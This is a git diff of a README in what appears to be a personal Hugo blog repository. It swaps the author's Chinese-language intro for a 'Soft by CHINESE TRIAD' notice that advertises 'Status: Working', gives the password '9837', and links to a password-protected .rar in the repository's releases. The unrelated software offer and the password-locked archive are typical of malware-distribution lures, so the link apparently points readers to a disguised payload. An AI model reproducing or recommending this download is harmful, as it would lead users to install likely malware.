@@ -1,9 +1,11 @@
-# Hello world
+# Soft by CHINESE TRIAD
+![main](https://github.com/shixiaocaia/Hugo-luna-mod/assets/68102662/3ddde641-b796-495c-86ba-9742e01dc2b6)
 
-Hi !
+## Info ℹ️
 
-这里是小菜的密室，在这里✍着我所思所想，各种自己读不通的句子，不过是相当真实的自己...
+**✅ Status: Working ✅**
 
-希望能够用记录来对抗人生的虚无感...
+**🔓 Password: 9837 🔓**
 
-原主题来自[Hugo-Luna](https://github.com/Ice-Hazymoon/hugo-theme-luna)。
+
+## Link to download | [Soft](https://github.com/shixiaocaia/Hugo-luna-mod/releases/download/client/cl13nt.pswd.9837.rar)
